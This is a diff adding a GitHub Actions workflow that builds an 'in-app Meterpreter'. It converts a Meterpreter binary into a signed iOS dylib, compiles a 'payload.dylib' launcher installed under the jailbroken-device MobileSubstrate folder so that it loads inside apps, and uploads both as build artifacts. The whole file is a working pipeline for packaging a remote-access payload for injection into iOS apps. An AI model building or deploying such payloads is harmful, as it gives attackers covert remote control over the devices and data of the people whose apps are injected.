@@ -1,0 +1,45 @@
+name: build-inapp-meterpreter
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: macos-13
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Get mettle tools
+        run: |
+          git clone --depth 1 https://github.com/rapid7/mettle.git mettle
+          chmod +x mettle/deps/app2dylib mettle/deps/ldid2
+
+      - name: Convert meterpreter to dylib
+        run: |
+          mettle/deps/app2dylib -o meterpreter.dylib msf_meterpreter
+          mettle/deps/ldid2 -S meterpreter.dylib
+
+      - name: Build in-process launcher
+        run: |
+          xcrun --sdk iphoneos clang -arch arm64 -O2 -fPIC -dynamiclib \
+            -install_name /var/jb/Library/MobileSubstrate/DynamicLibraries/payload.dylib \
+            -o payload.dylib launcher.c
+          mettle/deps/ldid2 -S payload.dylib
+
+      - name: Verify
+        run: |
+          file meterpreter.dylib payload.dylib
+          lipo -info meterpreter.dylib payload.dylib
+          nm -gU meterpreter.dylib | grep main
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: inapp-meterpreter
+          path: |
+            meterpreter.dylib
+            payload.dylib
